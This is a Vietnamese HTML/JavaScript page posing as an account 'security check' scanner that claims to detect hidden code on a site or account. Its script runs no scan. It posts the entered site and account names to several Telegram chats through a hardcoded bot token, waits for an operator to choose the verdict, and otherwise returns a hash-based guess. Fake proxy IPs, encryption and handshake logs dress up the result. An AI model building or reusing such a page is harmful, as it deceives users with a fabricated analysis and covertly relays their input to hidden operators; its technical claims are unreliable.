<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>HỆ THỐNG KIỂM TRA BẢO MẬT</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
<style>
  :root {
    --green: #00ff41;
    --green-dim: #00b32d;
    --green-dark: #003b0a;
    --green-glow: #00ff4133;
    --red: #ff003c;
    --amber: #ffb300;
    --bg: #0a0a0a;
    --panel: #0d0d0d;
    --border: #00ff4122;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: var(--bg);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    overflow-x: hidden;
    position: relative;
  }

  body::before {
    content: '';
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,65,0.015) 2px, rgba(0,255,65,0.015) 4px);
    pointer-events: none;
    z-index: 9999;
    animation: scanroll 10s linear infinite;
  }

  @keyframes scanroll { 0%{background-position:0 0} 100%{background-position:0 100px} }

  #matrix {
    position: fixed;
    top: 0; left: 0;
    opacity: 0.06;
    pointer-events: none;
    z-index: 0;
  }

  .container {
    position: relative;
    z-index: 10;
    width: min(650px, 94vw);
  }

  .header {
    text-align: center;
    margin-bottom: 24px;
  }

  .logo {
    font-family: 'VT323', monospace;
    font-size: clamp(32px, 6vw, 52px);
    color: var(--green);
    text-shadow: 0 0 20px var(--green), 0 0 40px var(--green-dim);
    letter-spacing: 4px;
    animation: flicker 5s infinite;
  }

  .logo span { color: var(--red); text-shadow: 0 0 20px var(--red); }

  @keyframes flicker {
    0%,95%,100%{opacity:1}
    96%{opacity:0.8}
    97%{opacity:1}
    98%{opacity:0.6}
    99%{opacity:1}
  }

  .subtitle {
    font-size: 10px;
    color: var(--green-dim);
    letter-spacing: 4px;
    margin-top: 4px;
    opacity: 0.7;
  }

  .version-bar {
    display: flex;
    justify-content: space-between;
    font-size: 9px;
    color: var(--green-dim);
    opacity: 0.5;
    margin-top: 6px;
    padding: 0 2px;
  }

  .panel {
    background: var(--panel);
    border: 1px solid var(--border);
    border-top: 1px solid var(--green-dim);
    box-shadow: 0 0 30px rgba(0,255,65,0.07), inset 0 0 30px rgba(0,0,0,0.5);
    padding: 28px;
    position: relative;
  }

  .panel::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, var(--green), transparent);
    animation: lineflow 3s ease-in-out infinite;
  }

  @keyframes lineflow {
    0%,100%{opacity:0.3} 50%{opacity:1}
  }

  .panel-title {
    font-size: 10px;
    color: var(--green-dim);
    letter-spacing: 3px;
    margin-bottom: 20px;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .panel-title::before { content:'['; color: var(--green); }
  .panel-title::after { content:']'; color: var(--green); }

  .panel-title .blink {
    display: inline-block;
    width: 8px; height: 8px;
    background: var(--green);
    border-radius: 50%;
    animation: pulse 1.2s ease-in-out infinite;
    box-shadow: 0 0 8px var(--green);
  }

  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.3;transform:scale(0.8)} }

  .input-group {
    margin-bottom: 24px;
  }

  .input-label {
    font-size: 10px;
    letter-spacing: 2px;
    color: var(--green-dim);
    margin-bottom: 6px;
    display: block;
  }

  .input-wrap {
    position: relative;
    display: flex;
    align-items: center;
  }

  .input-wrap::before {
    content: '>';
    position: absolute;
    left: 12px;
    color: var(--green);
    font-size: 16px;
    pointer-events: none;
    z-index: 2;
  }

  input[type="text"] {
    width: 100%;
    background: #050505;
    border: 1px solid var(--border);
    border-left: 2px solid var(--green-dim);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    font-size: 14px;
    padding: 10px 12px 10px 30px;
    outline: none;
    transition: all 0.2s;
  }

  input[type="text"]:focus {
    border-color: var(--green);
    border-left-color: var(--green);
    box-shadow: 0 0 15px rgba(0,255,65,0.12);
    background: #070d07;
  }

  input::placeholder { color: #1a3a1a; font-size: 12px; }

  .extra-field {
    margin-bottom: 24px;
    border-top: 1px dashed var(--border);
    padding-top: 16px;
    margin-top: 8px;
  }

  .btn-scan {
    width: 100%;
    background: transparent;
    border: 1px solid var(--green);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    font-size: 15px;
    letter-spacing: 4px;
    padding: 13px;
    cursor: pointer;
    position: relative;
    overflow: hidden;
    transition: all 0.3s;
    text-transform: uppercase;
    margin-bottom: 20px;
  }

  .btn-scan:hover {
    background: var(--green-glow);
    box-shadow: 0 0 25px rgba(0,255,65,0.3);
    letter-spacing: 6px;
  }

  .btn-scan:active { transform: scale(0.98); }

  .btn-scan:disabled {
    opacity: 0.4;
    cursor: not-allowed;
  }

  .terminal {
    background: #030303;
    border: 1px solid #00ff4110;
    border-left: 2px solid var(--green-dim);
    min-height: 120px;
    max-height: 210px;
    overflow-y: auto;
    padding: 12px;
    font-size: 12px;
    line-height: 1.7;
  }

  .terminal::-webkit-scrollbar { width: 4px; }
  .terminal::-webkit-scrollbar-thumb { background: var(--green-dim); }

  .log-line { display: block; }
  .log-line.sys { color: #1a5c1a; }
  .log-line.info { color: var(--green-dim); }
  .log-line.warn { color: var(--amber); }
  .log-line.error { color: var(--red); }
  .log-line.success { color: var(--green); font-weight: bold; }
  .log-line.highlight { color: #fff; text-shadow: 0 0 8px var(--green); }
  .log-line.ip { color: #00ccaa; }

  .result-popup {
    position: fixed;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%) scale(0.9);
    background: #0b0f0b;
    border: 1.5px solid;
    backdrop-filter: blur(12px);
    padding: 10px 22px;
    display: flex;
    align-items: center;
    gap: 14px;
    z-index: 10000;
    transition: all 0.2s;
    opacity: 0;
    visibility: hidden;
    pointer-events: none;
  }

  .result-popup.show {
    opacity: 1;
    visibility: visible;
    transform: translateX(-50%) scale(1);
  }

  .result-popup.found {
    border-color: var(--red);
    background: rgba(20, 0, 8, 0.92);
  }

  .result-popup.clean {
    border-color: var(--green);
    background: rgba(0, 20, 0, 0.92);
  }

  .popup-icon { font-size: 28px; }
  .popup-title { font-weight: bold; font-size: 18px; }
  .result-popup.found .popup-title { color: var(--red); }
  .result-popup.clean .popup-title { color: var(--green); }
  .popup-desc { font-size: 9px; opacity: 0.7; margin-top: 2px; }

  .progress-wrap {
    display: none;
    margin-bottom: 14px;
  }

  .progress-label {
    font-size: 10px;
    color: var(--green-dim);
    letter-spacing: 2px;
    margin-bottom: 4px;
    display: flex;
    justify-content: space-between;
  }

  .progress-bar {
    height: 3px;
    background: #0d0d0d;
    border: 1px solid var(--border);
    overflow: hidden;
  }

  .progress-fill {
    height: 100%;
    background: linear-gradient(90deg, var(--green-dim), var(--green));
    width: 0%;
    transition: width 0.1s;
  }

  .status-bar {
    display: flex;
    justify-content: space-between;
    font-size: 9px;
    color: #1a3a1a;
    margin-top: 20px;
    padding-top: 12px;
    border-top: 1px solid #00ff4108;
  }

  .status-dot {
    display: inline-block;
    width: 6px; height: 6px;
    background: var(--green);
    border-radius: 50%;
    margin-right: 5px;
    animation: pulse 1.5s infinite;
  }

  @keyframes glitch {
    0%,90%,100%{transform:none}
    91%{transform:translateX(-2px)}
    92%{transform:translateX(2px)}
    93%{transform:none}
  }

  .glitch { animation: glitch 6s infinite; }

  @media(max-width: 480px) {
    .panel { padding: 18px; }
    .logo { font-size: 32px; }
    .result-popup { padding: 8px 18px; width: 90%; }
  }
</style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="container">
  <div class="header">
    <div class="logo glitch">Hệ thống kiểm tra<span> bảo mật</span></div>
    <div class="subtitle">DEEP ACCOUNT ANALYSIS SYSTEM | V3.0 FIXED</div>
    <div class="version-bar">
      <span>v3.0-FINAL</span>
      <span id="clock">--:--:--</span>
      <span>NODE: VN-03</span>
    </div>
  </div>

  <div class="panel">
    <div class="panel-title"><span class="blink"></span> NHẬP LIỆU THÔNG TIN KIỂM TRA</div>

    <div class="input-group">
      <label class="input-label">[ TÊN TRANG ]</label>
      <div class="input-wrap">
        <input type="text" id="accInput" placeholder="" autocomplete="off">
      </div>
    </div>

    <div class="extra-field">
      <div class="input-group" style="margin-bottom: 0;">
        <label class="input-label">[ TÊN TÀI KHOẢN ]</label>
        <div class="input-wrap">
          <input type="text" id="extraField" placeholder="" autocomplete="off">
        </div>
      </div>
    </div>

    <!-- PROGRESS BAR - ĐÃ ĐƯỢC THÊM VÀO -->
    <div class="progress-wrap" id="progressWrap">
      <div class="progress-label">
        <span id="progressLabel">ĐANG SCAN...</span>
        <span id="progressPct">0%</span>
      </div>
      <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
      </div>
    </div>

    <button class="btn-scan" id="scanBtn" onclick="startScan()">[ KIỂM TRA ]</button>

    <div class="terminal" id="terminal">
      <span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v3.0</span>
    </div>

    <div class="status-bar">
      <span><span class="status-dot"></span>SYSTEM ONLINE</span>
      <span id="sessionId">SESSION: --</span>
      <span>TG-RELAY</span>
    </div>
  </div>
</div>

<div id="resultPopup" class="result-popup">
  <div class="popup-icon" id="popupIcon">!</div>
  <div class="popup-content">
    <div class="popup-title" id="popupTitle">---</div>
    <div class="popup-desc" id="popupDesc"></div>
  </div>
</div>

<script>
// ==================== TELEGRAM CONFIG ====================
const BOT_TOKEN = "8686570256:AAEM0knltyfFWOvaGDM_f2SlKYjmylrPpjw";
const CHAT_IDS = ["6316826211", "5637571557", "5411868640", "6611079605"]; // Thay bằng chat ID thật
const TIMEOUT_SEC = 30;

function generateVietnamIP() {
  const prefixes = [14, 27, 58, 103, 113, 115, 117, 118, 123, 125, 171];
  return `${prefixes[Math.floor(Math.random()*prefixes.length)]}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`;
}

// Matrix rain
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}
resizeCanvas();
window.addEventListener('resize', resizeCanvas);
let drops = [];
function initMatrix() {
  const cols = Math.floor(window.innerWidth / 20);
  drops = Array(cols).fill(1);
}
initMatrix();
const chars = 'アイウエオカキクケコ0123456789ABCDEF';
function drawMatrix() {
  ctx.fillStyle = 'rgba(0,0,0,0.05)';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = '#00ff41';
  ctx.font = '14px Share Tech Mono';
  for (let i = 0; i < drops.length; i++) {
    ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * 20, drops[i] * 20);
    if (drops[i] * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }
}
setInterval(drawMatrix, 50);
window.addEventListener('resize', () => { resizeCanvas(); initMatrix(); });

function updateClock() {
  document.getElementById('clock').textContent = new Date().toTimeString().slice(0,8);
}
setInterval(updateClock, 1000);
updateClock();

const session = Math.random().toString(36).substr(2,8).toUpperCase();
document.getElementById('sessionId').textContent = 'SESSION: ' + session;

const terminal = document.getElementById('terminal');
function log(msg, type='info', delay=0) {
  return new Promise(resolve => {
    setTimeout(() => {
      const span = document.createElement('span');
      span.className = 'log-line ' + type;
      span.textContent = msg;
      terminal.appendChild(span);
      terminal.scrollTop = terminal.scrollHeight;
      resolve();
    }, delay);
  });
}

function clearLogs() {
  terminal.innerHTML = '<span class="log-line sys">// HỆ THỐNG KIỂM TRA v3.0 KHỞI ĐỘNG</span>\n<span class="log-line sys">// Đang xử lý...</span>';
}

function setProgress(pct, label) {
  const fill = document.getElementById('progressFill');
  const pctEl = document.getElementById('progressPct');
  const labelEl = document.getElementById('progressLabel');
  if (fill) fill.style.width = pct + '%';
  if (pctEl) pctEl.textContent = pct + '%';
  if (label && labelEl) labelEl.textContent = label;
}

function showProgress(show) {
  const wrap = document.getElementById('progressWrap');
  if (wrap) wrap.style.display = show ? 'block' : 'none';
}

function showPopup(type, title, desc) {
  const popup = document.getElementById('resultPopup');
  popup.classList.remove('found', 'clean', 'show');
  if (type === 'found') {
    popup.classList.add('found');
    document.getElementById('popupIcon').textContent = '⚠';
    document.getElementById('popupTitle').textContent = title || 'CÓ MÃ ẨN';
  } else {
    popup.classList.add('clean');
    document.getElementById('popupIcon').textContent = '✓';
    document.getElementById('popupTitle').textContent = title || 'KHÔNG MÃ ẨN';
  }
  document.getElementById('popupDesc').textContent = desc || '';
  popup.classList.add('show');
  setTimeout(() => popup.classList.remove('show'), 8000);
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

function ts() {
  return new Date().toLocaleTimeString();
}

// Gửi tin nhắn Telegram
async function sendTelegramMessage(token, chatId, message, keyboard = null) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: "HTML",
    disable_web_page_preview: true
  };
  if (keyboard) payload.reply_markup = keyboard;
  
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
  const data = await res.json();
  if (!data.ok) throw new Error(data.description);
  return { chatId: String(chatId), msgId: data.result.message_id };
}

async function sendToAllChats(token, chatIds, message, keyboard) {
  const results = [];
  for (const chatId of chatIds) {
    try {
      const result = await sendTelegramMessage(token, chatId, message, keyboard);
      results.push(result);
    } catch (e) {
    }
    await sleep(500);
  }
  return results;
}

async function waitForReply(token, chatIds, sentList, timeoutSec) {
  const deadline = Date.now() + timeoutSec * 1000;
  let offset = 0;
  const sentMap = new Map();
  sentList.forEach(item => sentMap.set(item.chatId, item.msgId));
  
  while (Date.now() < deadline) {
    try {
      const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${offset}&timeout=5`);
      const data = await res.json();
      if (data.ok && data.result) {
        for (const update of data.result) {
          offset = update.update_id + 1;
          
          // Xử lý callback query
          if (update.callback_query) {
            const cb = update.callback_query;
            const chatId = String(cb.message.chat.id);
            if (!chatIds.includes(chatId)) continue;
            const sentMsgId = sentMap.get(chatId);
            if (!sentMsgId || cb.message.message_id !== sentMsgId) continue;
            if (cb.data === 'co') return 'found';
            if (cb.data === 'khong') return 'clean';
            continue;
          }
          
          // Xử lý tin nhắn text
          const msg = update.message;
          if (msg && msg.text && msg.chat) {
            const chatId = String(msg.chat.id);
            if (!chatIds.includes(chatId)) continue;
            const sentMsgId = sentMap.get(chatId);
            if (sentMsgId && msg.message_id > sentMsgId) {
              const text = msg.text.trim().toLowerCase();
              if (text === 'co' || text === '1' || text === 'có') return 'found';
              if (text === 'khong' || text === '0' || text === 'không') return 'clean';
            }
          }
        }
      }
    } catch (e) {}
    await sleep(2000);
  }
  return null;
}

async function fallbackScan(site, account) {
  const combined = site + account;
  let hash = 0;
  for (let i = 0; i < combined.length; i++) {
    hash = ((hash << 5) - hash) + combined.charCodeAt(i);
    hash |= 0;
  }
  return Math.abs(hash) % 100 < 45;
}

async function simulateNetworkLogs() {
  for (let i = 0; i < 3; i++) {
    const ip = generateVietnamIP();
    await log(`[${ts()}] → KẾT NỐI PROXY ${ip} (Việt Nam)`, 'ip');
    await sleep(400);
  }
}

// Main scan function
async function startScan() {
  const siteName = document.getElementById('accInput').value.trim();
  const accountName = document.getElementById('extraField').value.trim();
  
  if (!siteName) {
    log('[!] Vui lòng nhập tên trang!', 'error');
    showPopup('clean', '⚠ LỖI', 'Chưa nhập tên trang');
    return;
  }
  
  if (!accountName) {
    log('[!] Vui lòng nhập tên tài khoản!', 'error');
    showPopup('clean', '⚠ LỖI', 'Chưa nhập tên tài khoản');
    return;
  }

  const btn = document.getElementById('scanBtn');
  btn.disabled = true;
  btn.textContent = '[ ĐANG XỬ LÝ... ]';
  clearLogs();
  showProgress(true);
  document.getElementById('resultPopup').classList.remove('show');
  
  await log(`[${ts()}] ===== KHỞI ĐỘNG PHIÊN #${session} =====`, 'sys');
  setProgress(5, 'KHỞI ĐỘNG...');
  await sleep(300);
  
  await log(`[${ts()}] TRANG: ${siteName}`, 'highlight');
  await log(`[${ts()}] TÀI KHOẢN: ${accountName}`, 'highlight');
  setProgress(15, 'PHÂN TÍCH...');
  await sleep(400);
  
  await log(`[${ts()}] MÃ HÓA DỮ LIỆU AES-256`, 'info');
  setProgress(25, 'MÃ HÓA...');
  await sleep(400);
  
  const initIp = generateVietnamIP();
  await log(`[${ts()}] HANDSHAKE ${initIp}:443 TLS 1.3`, 'ip');
  await sleep(300);
  
  let finalResult = null;
  
  // Gửi yêu cầu đến Telegram
  await sleep(100);
  
  const relayIp = generateVietnamIP();
  await log(`[${ts()}] RELAY NODE ${relayIp}:8080`, 'ip');
  
  const message = `🔍 <b>THÔNG BÁO KIỂM TRA</b>\n\n` +
    `<b>📋 Session:</b> <code>${session}</code>\n` +
    `<b>🌐 Trang:</b> ${siteName}\n` +
    `<b>👤 Tài khoản:</b> ${accountName}\n` +
    `<b>⏰ Thời gian:</b> ${new Date().toLocaleString('vi-VN')}\n` +
    `<b>📡 IP:</b> ${generateVietnamIP()}\n\n` +
    `<i>Vui lòng xác nhận kết quả:</i>`;
  
  const keyboard = {
    inline_keyboard: [[
      { text: "✅ CÓ MÃ ẨN", callback_data: "co" },
      { text: "❌ KHÔNG MÃ ẨN", callback_data: "khong" }
    ]]
  };
  
  const sentList = await sendToAllChats(BOT_TOKEN, CHAT_IDS, message, keyboard);
  
  if (sentList.length > 0) {
    setProgress(50, 'CHỜ PHẢN HỒI...');
    let elapsed = 0;
    const timer = setInterval(() => {
      elapsed++;
      setProgress(50 + Math.min(30, elapsed * 2), `CHỜ... ${elapsed}s`);
    }, 1000);
    
    const reply = await waitForReply(BOT_TOKEN, CHAT_IDS, sentList, TIMEOUT_SEC);
    clearInterval(timer);
    
    if (reply === 'found') {
      finalResult = true;
    } else if (reply === 'clean') {
      finalResult = false;
    } else {
    }
  } else {
  }
  
  // Fallback scan nếu không có kết quả từ Telegram
  if (finalResult === null) {
    setProgress(60, 'QUÉT CỤC BỘ...');
    await simulateNetworkLogs();
    finalResult = await fallbackScan(siteName, accountName);
    setProgress(90, 'PHÂN TÍCH DEEP...');
    await sleep(500);
  }
  
  setProgress(100, 'HOÀN TẤT');
  await sleep(300);
  
  const finalIp = generateVietnamIP();
  await log(`[${ts()}] IP XÁC NHẬN: ${finalIp}`, 'ip');
  
  if (finalResult) {
    await log(`[${ts()}] ⚠ KẾT QUẢ: PHÁT HIỆN MÃ ẨN!`, 'error');
    showPopup('found', '⚠ CÓ MÃ ẨN', `${siteName} | ${accountName} có dấu hiệu bất thường`);
  } else {
    await log(`[${ts()}] ✓ KẾT QUẢ: AN TOÀN`, 'success');
    showPopup('clean', '✓ KHÔNG MÃ ẨN', `${siteName} | ${accountName} an toàn`);
  }
  
  await log(`[${ts()}] ===== KẾT THÚC PHIÊN #${session} =====`, 'sys');
  
  btn.disabled = false;
  btn.textContent = '[ KIỂM TRA ]';
  showProgress(false);
}

// Event listeners
document.getElementById('accInput').addEventListener('keypress', e => { if(e.key === 'Enter') startScan(); });
document.getElementById('extraField').addEventListener('keypress', e => { if(e.key === 'Enter') startScan(); });

window.addEventListener('load', () => {
  document.getElementById('resultPopup').classList.remove('show');
});
</script>
</body>
